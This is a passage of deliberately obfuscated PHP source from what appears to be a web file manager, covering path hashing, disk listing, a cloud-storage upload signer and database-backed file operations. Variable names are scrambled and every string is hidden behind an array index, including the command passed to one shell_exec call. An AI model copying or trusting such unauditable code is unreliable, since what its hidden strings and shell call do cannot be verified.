'') { $πﬁ‹‰∂î =& $_SERVER[Á≈ ä ∞]; $à¥Ü‚£≤ = substr($ØÎÛô´‹, 1, -1); $‚˙§ØÇﬁ = $πﬁ‹‰∂î[1274] . $à¥Ü‚£≤ . $πﬁ‹‰∂î[1275] . $ŒâëŸË˜ . $πﬁ‹‰∂î[1276]; $‚˙§ØÇﬁ = $∂⁄âıÀõ ? $‚˙§ØÇﬁ . $∂⁄âıÀõ . $πﬁ‹‰∂î[18] : $‚˙§ØÇﬁ; return $‚˙§ØÇﬁ; } public static function hashPath($Œ¥»Í‹ß, $†‚ÀÇΩÍ = true) { $£ºîÔÓ˝ =& $_SERVER[Á≈ ä ∞]; $Û“‰◊ÖÇ = is_array($Œ¥»Í‹ß) ? $Œ¥»Í‹ß : IO::info($Œ¥»Í‹ß); $ôø©·µﬁ = _get($Û“‰◊ÖÇ, $£ºîÔÓ˝[1277], $£ºîÔÓ˝[22]); if (!$ôø©·µﬁ && isset($Û“‰◊ÖÇ[$£ºîÔÓ˝[411]])) { $Û“‰◊ÖÇ = IO::info(KodIO::make($Û“‰◊ÖÇ[$£ºîÔÓ˝[411]])); $ôø©·µﬁ = _get($Û“‰◊ÖÇ, $£ºîÔÓ˝[1277], $£ºîÔÓ˝[22]); } if (!$ôø©·µﬁ && $†‚ÀÇΩÍ) { $ﬁã∑ï∫ = KodIO::parse($Û“‰◊ÖÇ[$£ºîÔÓ˝[94]]); if (!$ﬁã∑ï∫[$£ºîÔÓ˝[43]]) { $ôø©·µﬁ = IO::hashSimple($Û“‰◊ÖÇ[$£ºîÔÓ˝[94]]); } } if (!$ôø©·µﬁ) { $ôø©·µﬁ = md5($Û“‰◊ÖÇ[$£ºîÔÓ˝[94]] . $Û“‰◊ÖÇ[$£ºîÔÓ˝[86]] . $Û“‰◊ÖÇ[$£ºîÔÓ˝[95]]); } return $ôø©·µﬁ; } public static function initSystemPath() { $À∂∂ÕãÀ =& $_SERVER[Á≈ ä ∞]; if (defined($À∂∂ÕãÀ[1278])) { return; } define($À∂∂ÕãÀ[1278], self::systemPath($À∂∂ÕãÀ[1279])); define($À∂∂ÕãÀ[1280], self::systemPath($À∂∂ÕãÀ[1281])); define($À∂∂ÕãÀ[1282], self::systemPath($À∂∂ÕãÀ[1283])); define($À∂∂ÕãÀ[1284], self::systemPath($À∂∂ÕãÀ[1285])); IOHistory::bindEvent(); } public static function systemPath($÷√æ€˛ã) { $¢û‡∑ÌÚ =& $_SERVER[Á≈ ä ∞]; $Õ•‹Ñß¸ = $¢û‡∑ÌÚ[1286] . ucfirst($÷√æ€˛ã); $‰âØÌÇŸ = Model($¢û‡∑ÌÚ[777])->get($Õ•‹Ñß¸); if ($‰âØÌÇŸ) { return $‰âØÌÇŸ; } if ($÷√æ€˛ã == $¢û‡∑ÌÚ[1279]) { $‰âØÌÇŸ = self::make(Model($¢û‡∑ÌÚ[832])->systemRootPathAdd($¢û‡∑ÌÚ[553])); } else { $‰âØÌÇŸ = self::systemPath($¢û‡∑ÌÚ[1279]); $ﬂØí˜¯¬ = self::sourceID($‰âØÌÇŸ); $‰âØÌÇŸ = self::make(Model($¢û‡∑ÌÚ[832])->mkdir($ﬂØí˜¯¬, $÷√æ€˛ã)); } Model($¢û‡∑ÌÚ[777])->set($Õ•‹Ñß¸, $‰âØÌÇŸ); return $‰âØÌÇŸ; } public static function systemFolder($ïéÙÑ÷â) { $µ∂‡‡È¸ = IO_PATH_SYSTEM_SOURCE . $ïéÙÑ÷â; $™âÌàç¿ = Cache::get($µ∂‡‡È¸); if (!$™âÌàç¿) { $í‘„„∂≠ = IO::infoFull($µ∂‡‡È¸); if (!$í‘„„∂≠) { $™âÌàç¿ = IO::mkdir($µ∂‡‡È¸, REPEAT_SKIP); } else { $™âÌàç¿ = $í‘„„∂≠[$_SERVER[Á≈ ä ∞][94]]; } Cache::set($µ∂‡‡È¸, $™âÌàç¿, 3600 * 10); } return $™âÌàç¿; } public static function defaultDriver() { return Model($_SERVER[Á≈ ä ∞][774])->defaultDriver(); } public static function defaultIO() { $ÂÆ∞›’Í =& $_SERVER[Á≈ ä ∞]; $ë’∞êóø = self::defaultDriver(); return $ÂÆ∞›’Í[1287] . $ë’∞êóø[$ÂÆ∞›’Í[408]] . $ÂÆ∞›’Í[1276]; } public static function defaultDriverInit() { static $Øü±ß¬Ó = false; if ($Øü±ß¬Ó) { return $Øü±ß¬Ó; } $Øü±ß¬Ó = IO::init(self::defaultIO()); return $Øü±ß¬Ó; } public static function fileTypeList() { $⁄®¿∑ûê =& $_SERVER[Á≈ ä ∞]; $Î≥á˜‡Ø = $GLOBALS[$⁄®¿∑ûê[16]][$⁄®¿∑ûê[1288]]; foreach ($Î≥á˜‡Ø as $”ÅÙ£î¡ => $›áñÀ‡) { $Œﬁ—Úœ‚ = $⁄®¿∑ûê[1289] . $”ÅÙ£î¡; $Ç™ç’¯¶ = LNG($Œﬁ—Úœ‚); if ($Œﬁ—Úœ‚ != $Ç™ç’¯¶) { $Î≥á˜‡Ø[$”ÅÙ£î¡][$⁄®¿∑ûê[42]] = $Ç™ç’¯¶; } } return $Î≥á˜‡Ø; } public static function diskList($Ã≤ôÓ˘˜ = true) { $£∏œ‰Æ≠ = $_SERVER[Á≈ ä ∞][1290]; if ($Ã≤ôÓ˘˜) { $øâ‚í‰ó = Cache::get($£∏œ‰Æ≠); if (is_array($øâ‚í‰ó)) { return $øâ‚í‰ó; } } $øâ‚í‰ó = self::diskListGet(); Cache::set($£∏œ‰Æ≠, $øâ‚í‰ó, 60); return $øâ‚í‰ó; } public static function diskListGet() { $˚™Òí‘¨ =& $_SERVER[Á≈ ä ∞]; $Í◊Ω¶È = array(); if ($GLOBALS[$˚™Òí‘¨[16]][$˚™Òí‘¨[1291]] == $˚™Òí‘¨[1292]) { $ÎÎß¿Üå = $˚™Òí‘¨[1293]; for ($˛éÒÉ°¡ = 0; $˛éÒÉ°¡ < strlen($ÎÎß¿Üå); $˛éÒÉ°¡++) { $ÎÏËˆﬁø = $ÎÎß¿Üå[$˛éÒÉ°¡] . $˚™Òí‘¨[1294]; if (file_exists($ÎÏËˆﬁø)) { $Í◊Ω¶È[] = $ÎÏËˆﬁø; } } return $Í◊Ω¶È; } if (!function_exists($˚™Òí‘¨[108])) { $Í◊Ω¶È[] = $˚™Òí‘¨[842]; return $Í◊Ω¶È; } $ŸÈòß∫ù = explode($˚™Òí‘¨[11], shell_exec($˚™Òí‘¨[1295])); array_shift($ŸÈòß∫ù); array_pop($ŸÈòß∫ù); $Øªè§˘‘ = array($˚™Òí‘¨[1296], $˚™Òí‘¨[1297], $˚™Òí‘¨[1298], $˚™Òí‘¨[1299], $˚™Òí‘¨[1300], $˚™Òí‘¨[1301], $˚™Òí‘¨[1302], $˚™Òí‘¨[1303]); foreach ($ŸÈòß∫ù as $ö√™Ω˚∂) { $Àë˛Ê˚ä = preg_split($˚™Òí‘¨[1304], $ö√™Ω˚∂); $ÎÏËˆﬁø = $Àë˛Ê˚ä[count($Àë˛Ê˚ä) - 1]; if (!strstr($Àë˛Ê˚ä[0], $˚™Òí‘¨[1305]) || !$ÎÏËˆﬁø) { continue; } $πôß‘€˜ = rtrim($ÎÏËˆﬁø, $˚™Òí‘¨[18]) . $˚™Òí‘¨[18]; if (in_array($πôß‘€˜, $Øªè§˘‘)) { continue; } $Í◊Ω¶È[] = $πôß‘€˜; } return $Í◊Ω¶È; } public static function isSameDisk($Î–ÁŒÊ⁄, $’¨çãº˙) { $Ó˚«á„„ =& $_SERVER[Á≈ ä ∞]; if ($GLOBALS[$Ó˚«á„„[16]][$Ó˚«á„„[1291]] == $Ó˚«á„„[1292]) { return strtolower(substr($Î–ÁŒÊ⁄, 0, 1)) == strtolower(substr($’¨çãº˙, 0, 1)); } $Ë¸ÃÖË“ = self::diskList(); $ òöäŒâ = !1; $âûè¸‘⁄ = !1; sort($Ë¸ÃÖË“); $Ë¸ÃÖË“ = array_reverse($Ë¸ÃÖË“); $Î–ÁŒÊ⁄ = rtrim($Î–ÁŒÊ⁄, $Ó˚«á„„[18]) . $Ó˚«á„„[18]; $’¨çãº˙ = rtrim($’¨çãº˙, $Ó˚«á„„[18]) . $Ó˚«á„„[18]; foreach ($Ë¸ÃÖË“ as $Ï›ªúÒÔ) { $éÚ˝≥öÔ = strlen($Ï›ªúÒÔ); if (!$ òöäŒâ && substr($Î–ÁŒÊ⁄, 0, $éÚ˝≥öÔ) == $Ï›ªúÒÔ) { $ òöäŒâ = $Ï›ªúÒÔ; } if (!$âûè¸‘⁄ && substr($’¨çãº˙, 0, $éÚ˝≥öÔ) == $Ï›ªúÒÔ) { $âûè¸‘⁄ = $Ï›ªúÒÔ; } if ($ òöäŒâ && $âûè¸‘⁄) { break; } } return $ òöäŒâ === $âûè¸‘⁄; } public static function transferType($ ˘éÖ†ß, $ß™µË˘ä) { $…¨–∏ªà =& $_SERVER[Á≈ ä ∞]; $•Ä–˚¸º = self::driverType($ ˘éÖ†ß); $é≤Ÿëé∫ = self::driverType($ß™µË˘ä); if ($•Ä–˚¸º[$…¨–∏ªà[43]] == $é≤Ÿëé∫[$…¨–∏ªà[43]] && $•Ä–˚¸º[$…¨–∏ªà[1306]] == $é≤Ÿëé∫[$…¨–∏ªà[1306]]) { return $…¨–∏ªà[1307]; } if ($•Ä–˚¸º[$…¨–∏ªà[43]] == $…¨–∏ªà[871] && $é≤Ÿëé∫[$…¨–∏ªà[43]] == $…¨–∏ªà[116]) { return $…¨–∏ªà[1202]; } if ($•Ä–˚¸º[$…¨–∏ªà[43]] == $…¨–∏ªà[116] && $é≤Ÿëé∫[$…¨–∏ªà[43]] == $…¨–∏ªà[871]) { return $…¨–∏ªà[117]; } return $…¨–∏ªà[1308]; } public static function driverType($ç≤§‘¡ï) { $©ÃºÛÒ’ =& $_SERVER[Á≈ ä ∞]; $Ïó√†¬Ω = str_replace($©ÃºÛÒ’[1309], $©ÃºÛÒ’[22], strtolower($ç≤§‘¡ï->getType())); if ($Ïó√†¬Ω == $©ÃºÛÒ’[765] || $Ïó√†¬Ω == $©ÃºÛÒ’[1310] || $Ïó√†¬Ω == $©ÃºÛÒ’[1311]) { $ç≤§‘¡ï = self::defaultDriverInit(); } else { if ($Ïó√†¬Ω == $©ÃºÛÒ’[1209] || $Ïó√†¬Ω == $©ÃºÛÒ’[1312]) { $ç≤§‘¡ï = IO::init($ç≤§‘¡ï->pathParse[$©ÃºÛÒ’[1154]]); } } $ËË‡–ÖÆ = $ç≤§‘¡ï->path; $Ïó√†¬Ω = str_replace($©ÃºÛÒ’[1309], $©ÃºÛÒ’[22], strtolower($ç≤§‘¡ï->getType())); if ($Ïó√†¬Ω == $©ÃºÛÒ’[116]) { return array($©ÃºÛÒ’[43] => $©ÃºÛÒ’[116], $©ÃºÛÒ’[1306] => $©ÃºÛÒ’[22], $©ÃºÛÒ’[94] => $ËË‡–ÖÆ); } return array($©ÃºÛÒ’[43] => $©ÃºÛÒ’[871], $©ÃºÛÒ’[1306] => $ç≤§‘¡ï->pathDriver, $©ÃºÛÒ’[94] => $ËË‡–ÖÆ); } public static function pathDriverType($í ´…¡Ò) { return $í ´…¡Ò ? self::driverType(IO::init($í ´…¡Ò)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¥…‡∑ïï) { parent::__construct($¥…‡∑ïï); $this->signatureVersion($_SERVER[Á≈ ä ∞][226]); } public function uploadFormData($Àîø◊ÌÔ, $∫ˆÃÏ˛” = 3600) { $∂ÈÅÓç‚ =& $_SERVER[Á≈ ä ∞]; $ëåÆıüÍ = $∂ÈÅÓç‚[208]; $π€“πÀ¶ = $∂ÈÅÓç‚[241]; $¯ÎØìç† = $∂ÈÅÓç‚[1313]; $§ÂáﬂÜ‰ = gmdate($∂ÈÅÓç‚[1314], time() + $∫ˆÃÏ˛”); $ƒõ«¢±Õ = (string) time() . $∂ÈÅÓç‚[81] . (string) (time() + $∫ˆÃÏ˛”); $´≥Æ∑ÄŒ = array($∂ÈÅÓç‚[1315] => $§ÂáﬂÜ‰, $∂ÈÅÓç‚[1316] => array(array($∂ÈÅÓç‚[1317] => $ëåÆıüÍ), array($∂ÈÅÓç‚[1318] => $this->bucket), array($∂ÈÅÓç‚[1319], $∂ÈÅÓç‚[1320], $∂ÈÅÓç‚[22]), array($∂ÈÅÓç‚[1321] => $¯ÎØìç†), array($∂ÈÅÓç‚[1322] => $π€“πÀ¶), array($∂ÈÅÓç‚[1323] => $this->accessKey), array($∂ÈÅÓç‚[1324] => $ƒõ«¢±Õ))); $´≥Æ∑ÄŒ = json_encode($´≥Æ∑ÄŒ); $≥∂‰Ìêë = hash_hmac($∂ÈÅÓç‚[241], $ƒõ«¢±Õ, $this->secret); $√´îÚ‘Ï = sha1($´≥Æ∑ÄŒ); $˙˚≤‰€® = hash_hmac($∂ÈÅÓç‚[241], $√´îÚ‘Ï, $≥∂‰Ìêë); $ë∆óï…≈ = array($∂ÈÅÓç‚[1317] => $ëåÆıüÍ, $∂ÈÅÓç‚[1321] => $¯ÎØìç†, $∂ÈÅÓç‚[1325] => base64_encode($´≥Æ∑ÄŒ), $∂ÈÅÓç‚[1322] => $π€“πÀ¶, $∂ÈÅÓç‚[1323] => $this->accessKey, $∂ÈÅÓç‚[1326] => $ƒõ«¢±Õ, $∂ÈÅÓç‚[1327] => $˙˚≤‰€®, $∂ÈÅÓç‚[191] => $this->getHost()); return $ë∆óï…≈; } public function fileOutLink($ú∫©∂˛) { $¡ûà∏∑ò =& $_SERVER[Á≈ ä ∞]; if (substr($ú∫©∂˛, 0, 7) == $¡ûà∏∑ò[1328]) { $ú∫©∂˛ = $¡ûà∏∑ò[1329] . substr($ú∫©∂˛, 7); } header($¡ûà∏∑ò[171] . $ú∫©∂˛); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ƒç¯ÃÁÉ) { $this->pathParse = $ƒç¯ÃÁÉ; $this->model = Model($_SERVER[Á≈ ä ∞][1330]); } public function getPath($Åƒ∆‡Æ‡) { return trim($Åƒ∆‡Æ‡, $_SERVER[Á≈ ä ∞][18]); } public function pathFather($≠Ò¬îó∑) { $„ÊÏ’©– = $this->parse($≠Ò¬îó∑); $„ÊÏ’©– = $this->infoSimple($≠Ò¬îó∑); return $„ÊÏ’©– ? $„ÊÏ’©–[$_SERVER[Á≈ ä ∞][441]] : !1; } public function pathThis($ñ»¿…Õ€) { $œ©±Ω´ÿ = $this->infoSimple($ñ»¿…Õ€); return $œ©±Ω´ÿ ? $œ©±Ω´ÿ[$_SERVER[Á≈ ä ∞][42]] : !1; } public function getPathOuter($∞òÖã—û) { if (!$∞òÖã—û) { return $∞òÖã—û; } $œ§Ñ®Õø = $this->parse($∞òÖã—û); return KodIO::make($œ§Ñ®Õø[$_SERVER[Á≈ ä ∞][408]]); } public function copyFolderFromIO($“æœŸÂå, $≥·ñ≤Ô¿, $€çßéï∆, $‰Œíƒ…ˆ, $åí˙ÙûÊ) { $¯˚Ó´ÆŒ = $this->model->copyFolderFromIO($“æœŸÂå, $≥·ñ≤Ô¿, $€çßéï∆, $‰Œíƒ…ˆ, $åí˙ÙûÊ); return KodIO::make($¯˚Ó´ÆŒ); } public function isParentOf($Á˘ÚÈàè, $ÀÌçÄ≥â) { return $this->model->isParentOf($Á˘ÚÈàè, $ÀÌçÄ≥â); } public function mkfile($ˆïΩ…ÒÂ, $Üéö√ƒ˙ = '', $∞®»∞∑ﬁ = REPEAT_RENAME) { $Á¸‘Ë£Ó =& $_SERVER[Á≈ ä ∞]; $≠ºó°†Á = $this->parse($ˆïΩ…ÒÂ); $ˆïΩ…ÒÂ = $≠ºó°†Á[$Á¸‘Ë£Ó[408]]; for ($Ïû‘¿È = 0; $Ïû‘¿È < count($≠ºó°†Á[$Á¸‘Ë£Ó[1331]]); $Ïû‘¿È++) { $™ø¥¸Ùﬁ = $≠ºó°†Á[$Á¸‘Ë£Ó[1331]][$Ïû‘¿È]; if ($Ïû‘¿È == count($≠ºó°†Á[$Á¸‘Ë£Ó[1331]]) - 1) { $ˆïΩ…ÒÂ = $this->model->mkfile($ˆïΩ…ÒÂ, $™ø¥¸Ùﬁ, $Üéö√ƒ˙, $∞®»∞∑ﬁ); break; } $ˆïΩ…ÒÂ = $this->model->mkdir($ˆïΩ…ÒÂ, $™ø¥¸Ùﬁ, REPEAT_SKIP); } return $this->getPathOuter($ˆïΩ…ÒÂ); } public function mkdir($Ãî∑Û◊¯, $„ÅÉ‰•ÿ = REPEAT_SKIP) { $í≤¥„˘˚ =& $_SERVER[Á≈ ä ∞]; $±´‹ﬁ∫Ú = $this->parse($Ãî∑Û◊¯); $Ãî∑Û◊¯ = $±´‹ﬁ∫Ú[$í≤¥„˘˚[408]]; for ($ÍóπÓÃ˘ = 0; $ÍóπÓÃ˘ < count($±´‹ﬁ∫Ú[$í≤¥„˘˚[1331]]); $ÍóπÓÃ˘++) { $òÇû»ıÉ = $±´‹ﬁ∫Ú[$í≤¥„˘˚[1331]][$ÍóπÓÃ˘]; $Ãî∑Û◊¯ = $this->model->mkdir($Ãî∑Û◊¯, $òÇû»ıÉ, $„ÅÉ‰•ÿ); } return $this->getPathOuter($Ãî∑Û◊¯); } public function copyFile($ËΩ◊ Î¢, $Œ·Ï‚⁄‹, $◊≠ùŒßæ = REPEAT_REPLACE) { $îû≤ø∫‚ =& $_SERVER[Á≈ ä ∞]; $ºÊ⁄•’û = $this->parse($Œ·Ï‚⁄‹); $»ú∞ÇüÈ = $this->model->copy($ËΩ◊ Î¢, $ºÊ⁄•’û[$îû≤ø∫‚[408]], $◊≠ùŒßæ, $ºÊ⁄•’û[$îû≤ø∫‚[94]]); return $»ú∞ÇüÈ ? $this->getPathOuter($»ú∞ÇüÈ) : !1; } public function moveFile($Øíµì“ò, $Óü˝èÉÀ, $º˜æü·∑ = REPEAT_REPLACE) { $ù∑„»◊œ =& $_SERVER[Á≈ ä ∞]; $û¡π®ÑÒ = $this->parse($Óü˝èÉÀ); $ è„Ôß÷ = $this->model->move($Øíµì“ò, $û¡π®ÑÒ[$ù∑„»◊œ[408]], $º˜æü·∑, $û¡π®ÑÒ[$ù∑„»◊œ[94]]); return $ è„Ôß÷ ? $this->getPathOuter($ è„Ôß÷) : !1; } public function copy($ï≠ √∆ù, $ÒàÃÅõÀ, $êÕñÀ»ß = REPEAT_REPLACE, $≠≠Ú≈”ô = false) { $œôÎõìÊ = $this->parse($ÒàÃÅõÀ); $€çéıπ = $this->model->copy($ï≠ √∆ù, $œôÎõìÊ[$_SERVER[Á≈ ä ∞][408]], $êÕñÀ»ß, $≠≠Ú≈”ô); return $€çéıπ ? $this->getPathOuter($€çéıπ) : !1; } public function moveSameAllow() { } public function move($ùå·ß—„, $çâ…¯µ≈, $÷∫π…ÉÇ = REPEAT_REPLACE, $Õ´÷””¯ = false) { $≈’ÊçˆÆ = $this->parse($çâ…¯µ≈); $—‹êÈºå = $this->model->move($ùå·ß—„, $≈’ÊçˆÆ[$_SERVER[Á≈ ä ∞][408]], $÷∫π…ÉÇ, $Õ´÷””¯); return $—‹êÈºå ? $this->getPathOuter($—‹êÈºå) : !1; } public function remove($Ò¢çúΩ¸, $¡˝˝ﬂ¨¥ = true) { return $this->model->remove($Ò¢çúΩ¸, $¡˝˝ﬂ¨¥); } public function rename($öﬁÿ£˙´, $óØÊÛ«¥) { $ç≤†ÌÛÆ = $this->model->rename($öﬁÿ£˙´, $óØÊÛ«¥); return $ç≤†ÌÛÆ ? $this->getPathOuter($öﬁÿ£˙´) : $ç≤†ÌÛÆ; } public function size($Á€É“”˘) { $·†õÆÉ˝ = $this->infoSimple($Á€É“”˘); return $·†õÆÉ˝ ? $·†õÆÉ˝[$_SERVER[Á≈ ä ∞][86]] : 0; } public function infoSimple($⁄üŸå˚Ÿ) { return $this->model->sourceInfo($⁄üŸå˚Ÿ); } public function info($öèº˛è‚) { return $this->infoParse($öèº˛è‚); } public function infoAuth($°¬Ç∂Ÿ›) { return $this->infoParse($°¬Ç∂Ÿ›, !1, !0); } public function infoWithChildren($Û®≈ê«À) { return $this->infoParse($Û®≈ê«À, !0); } protected function infoParse($¨»é≥ﬂ“, $˘ò§€ÕÑ = false, $π®±‡∫ñ = false) { if (!$˘ò§€ÕÑ) { return $this->model->pathInfo($¨»é≥ﬂ“, $π®±‡∫ñ); } return $this->model->pathInfoMore($¨»é≥ﬂ“); } public function infoFull($ä±£º‚’) { $•≈™¡Á“ =& $_SERVER[Á≈ ä ∞]; $‘ñ§øπ˚ = explode($•≈™¡Á“[18], $ä±£º‚’); $˚’ÆÖˆ´ = implode($•≈™¡Á“[18], array_splice($‘ñ§øπ˚, 1)); return $this->model->pathInfoByPath($‘ñ§øπ˚[0], $˚’ÆÖˆ´); } public function hashSimple($ßòáåÜ«) { $Æ√ƒ˚õª =& $_SERVER[Á≈ ä ∞]; $…⁄Û”πÔ = $this->infoWithChildren($ßòáåÜ«); return $…⁄Û”πÔ[$Æ√ƒ˚õª[180]][$Æ√ƒ˚õª[187]]; } public function hashMd5($Ÿ¿ª‰ï¯) { $◊Óàñ¨Ÿ =& $_SERVER[Á≈ ä ∞]; $Õ¥û¢ÀÌ = $this->infoWithChildren($Ÿ¿ª‰ï¯); return $Õ¥û¢ÀÌ[$◊Óàñ¨Ÿ[180]][$◊Óàñ¨Ÿ[186]]; } public function exist($£ºÃˆñÆ) { $¢Ç÷∑•¿ =& $_SERVER[Á≈ ä ∞]; $Í¬“äâΩ = $this->parse($£ºÃˆñÆ); if (!$Í¬“äâΩ[$¢Ç÷∑•¿[94]]) { return $this->isFile($£ºÃˆñÆ) || $this->isFolder($£ºÃˆñÆ); } $õ€«í≥« = array($¢Ç÷∑•¿[410] => $Í¬“äâΩ[$¢Ç÷∑•¿[408]], $¢Ç÷∑•¿[42] => $Í¬“äâΩ[$¢Ç÷∑•¿[94]]); $¿ûéé∂Ñ = $this->model->where($õ€«í≥«)->find(); return $¿ûéé∂Ñ ? !0 : !1; } public function isFile($ÂÕöÙ‰ˆ) { $¯Ù”≥÷ÿ =& $_SERVER[Á≈ ä ∞]; $Ûã¬†Å˝ = $this->infoSimple($ÂÕöÙ‰ˆ); return $Ûã¬†Å˝ && $Ûã¬†Å˝[$¯Ù”≥÷ÿ[419]] == $¯Ù”≥÷ÿ[98] ? !1 : !0; } public function isFolder($≈ò¶˚ÒÔ) { $Ú“ôãÛò =& $_SERVER[Á≈ ä ∞]; $”îÜØÄ∑ = $this->infoSimple($≈ò¶˚ÒÔ); return $”îÜØÄ∑ && $”îÜØÄ∑[$Ú“ôãÛò[419]] == $Ú“ôãÛò[98] ? !0 : !1; } public function listPath($é´˚‡›‚, $„’ÿ”Ü‹ = false) { $˙‚“ı≈ =& $_SERVER[Á≈ ä ∞]; if ($é´˚‡›‚ == $˙‚“ı≈[22]) { return !1; } $Ûﬁœøè„ = array($˙‚“ı≈[410] => $é´˚‡›‚); if ($„’ÿ”Ü‹) { return $this->model->listSource($Ûﬁœøè„, -1); } return $this->model->listSource($Ûﬁœøè„); } public function has($Ç˜Ä’∏í, $ßö◊∫Ÿù = false, $Ãœ¿ÒÜÏ = null) { $±äìÇñæ =& $_SERVER[Á≈ ä ∞]; $Å‹™ÙØâ = $this->infoWithChildren($Ç˜Ä’∏í); if ($ßö◊∫Ÿù) { return array($±äìÇñæ[218] => $Å‹™ÙØâ[$±äìÇñæ[218]], $±äìÇñæ[217] => $Å‹™ÙØâ[$±äìÇñæ[217]]); } return $Ãœ¿ÒÜÏ ? $Å‹™ÙØâ[$±äìÇñæ[218]] : $Å‹™ÙØâ[$±äìÇñæ[217]]; } public function listAll($Æüô•™Œ) { $Õ‚ƒç‘ö = IO::info($this->pathParse[$_SERVER[Á≈ ä ∞][94]]); if (!$Õ‚ƒç‘ö) { return array(); } return $this->model->listAll($Æüô•™Œ); } public function getContent($°äçÚˆµ) { return $this->model->getContent($°äçÚˆµ); } public function setContent($»ô›ú¸˛, $“—ΩÃ©œ = '') { return $this->model->setContent($»ô›ú¸˛, $“—ΩÃ©œ); } public function fileSubstr($ææîø…Œ, $ô¸úÉîÖ, $çÁ’®ß) { return $this->model->fileSubstr($ææîø…Œ, $ô¸úÉîÖ, $çÁ’®ß); } public function download($Ω≈ç ç•, $ò∫ãØÄ÷ = '') { $ˆ†˝÷‘‰ = get_path_father($ò∫ãØÄ÷); $˝Ú≤ıÛÏ = get_path_this($ò∫ãØÄ÷); $Úˆ©†ÿ∂ = $this->model->fileInfoGet($Ω≈ç ç•); $Û˜á„ú = IO::copy($Úˆ©†ÿ∂[$_SERVER[Á≈ ä ∞][94]], $ˆ†˝÷‘‰, !1, $˝Ú≤ıÛÏ); return $Û˜á„ú; } public function setModifyTime($Æ≥èÜá», $ÂÊ©¡Ê– = '') { $±ÏËﬁ¸’ =& $_SERVER[Á≈ ä ∞]; if (!$Æ≥èÜá») { return; } $this->model->where(array($±ÏËﬁ¸’[426] => $Æ≥èÜá»))->save(array($±ÏËﬁ¸’[95] => $ÂÊ©¡Ê–)); } public function upload($Ÿ§Ö°Èê, $≥®ÈÎ∏é, $⁄„ÅÌñ“ = false, $ÀœÑ§≥∂ = REPEAT_REPLACE) { $ï´…ÂÓ„ =& $_SERVER[Á≈ ä ∞]; $£–ªÒÀ∫ = $this->parse($Ÿ§Ö°Èê); $©¢™ı≥≈ = $this->model->addFile($£–ªÒÀ∫[$ï´…ÂÓ„[408]], $≥®ÈÎ∏é, $£–ªÒÀ∫[$ï´…ÂÓ„[94]], $⁄„ÅÌñ“, $ÀœÑ§≥∂); return $this->getPathOuter($©¢™ı≥≈); } public function uploadFileByID($Ô’»Â»˛, $∏≈ä∂¸, $ãÅçƒ◊¯) { $ú≥ àﬁ∏ =& $_SERVER[Á≈ ä ∞]; $ñ—ﬁËõ˜ = $this->parse($Ô’»Â»˛); $ﬁ¡íÿûä = $this->model->addFileByFileID($ñ—ﬁËõ˜[$ú≥ àﬁ∏[408]], $∏≈ä∂¸, $ñ—ﬁËõ˜[$ú≥ àﬁ∏[94]], $ãÅçƒ◊¯); return $this->getPathOuter($ﬁ¡íÿûä); } public function addFileByRemote($Õ¨ªëàö, $¢‡ÂùÕè, $ªËªãª§ = array(), $ù˝ôÎéÂ = '', $â∞üÙÜ‡) { $πˆ¨ü‘Ä =& $_SERVER[Á≈ ä ∞]; $âæÙÄå† = $this->parse($Õ¨ªëàö); $ù˝ôÎéÂ = empty($ù˝ôÎéÂ) ? $âæÙÄå†[$πˆ¨ü‘Ä[94]] : $ù˝ôÎéÂ; $’¶êß¢« = $this->model->addFileByRemote($âæÙÄå†[$πˆ¨ü‘Ä[408]], $¢‡ÂùÕè, $ù˝ôÎéÂ, $ªËªãª§, $â∞üÙÜ‡); return $this->getPathOuter($’¶êß¢«); } public function uploadLink($ÿÓÄ˛„à, $§ÚÊË˚ª = 0) { $÷˛ﬁ˛éÇ =& $_SERVER[Á≈ ä ∞]; $ïÂÍö∆Ç = $this->parse($ÿÓÄ˛„à); $œ ∞ÛÄî = _get($GLOBALS[$÷˛ﬁ˛éÇ[17]], $÷˛ﬁ˛éÇ[1332]); $ÛﬂÄöÈß = _get($GLOBALS[$÷˛ﬁ˛éÇ[17]], $÷˛ﬁ˛éÇ[1333]); $ÿÓÄ˛„à = Model($÷˛ﬁ˛éÇ[618])->createFileName($ïÂÍö∆Ç[$÷˛ﬁ˛éÇ[94]], $œ ∞ÛÄî, $ÛﬂÄöÈß); return IO::uploadLink($ÿÓÄ˛„à, $§ÚÊË˚ª); } public function fileNameAuto($Ë‡∑˘Çç, $ó∂‘±≥è, $çÜ·µª› = REPEAT_REPLACE, $´ôÂ„Ì∂ = false) { return $this->model->fileNameAuto($Ë‡∑˘Çç, $ó∂‘±≥è, $çÜ·µª›, $´ôÂ„Ì∂); } public function fileNameExist($í˝æò˘ª, $‚¬îÇœé) { return $this->model->fileNameExist($í˝æò˘ª, $‚¬îÇœé); } protected function _fileOut($ñ∏°ÀÖÜ, $Ú¢ßß‹Ω = false, $ã§°ªçí = false, $˘óˆﬁÕì = '', $‚é¿¬ÛÚ = false) { $√…Í‹˜≤ =& $_SERVER[Á≈ ä ∞]; $Æ∫˜∫Ωé = $this->model->sourceInfo($ñ∏°ÀÖÜ); if ($Æ∫˜∫Ωé[$√…Í‹˜≤[419]] == $√…Í‹˜≤[98]) { header($√…Í‹˜≤[1334]); die; } $àé∫˜ã’ = $this->model->fileInfoGet($ñ∏°ÀÖÜ); $˘óˆﬁÕì = $àé∫˜ã’[$√…Í‹˜≤[186]] ? $àé∫˜ã’[$√…Í‹˜≤[186]] : $˘óˆﬁÕì; $â´•ÏÖÂ = isset($GLOBALS[$√…Í‹˜≤[1335]]) ? $GLOBALS[$√…Í‹˜≤[1335]] : $Æ∫˜∫Ωé[$√…Í‹˜≤[42]]; if ($‚é¿¬ÛÚ) { return IO::fileOutServer($àé∫˜ã’[$√…Í‹˜≤[94]], $Ú¢ßß‹Ω, $â´•ÏÖÂ, $˘óˆﬁÕì); } IO::fileOut($àé∫˜ã’[$√…Í‹˜≤[94]], $Ú¢ßß‹Ω, $â´•ÏÖÂ, $˘óˆﬁÕì); } public function fileOut($∆û±∑ˆí, $ÀÎÏ©ºØ = false, $êàÉœ“ˆ = false, $·˙Û≤ª± = '') { $this->_fileOut($∆û±∑ˆí, $ÀÎÏ©ºØ, $êàÉœ“ˆ, $·˙Û≤ª±); } public function fileOutServer($∂øóÄ , $⁄ìé≤°Ç = false, $üÔî¸Ïﬂ = false, $ÅΩ‚æ…Å = '') { $this->_fileOut($∂øóÄ , $⁄ìé≤°Ç, $üÔî¸Ïﬂ, $ÅΩ‚æ…Å, !0); } protected function 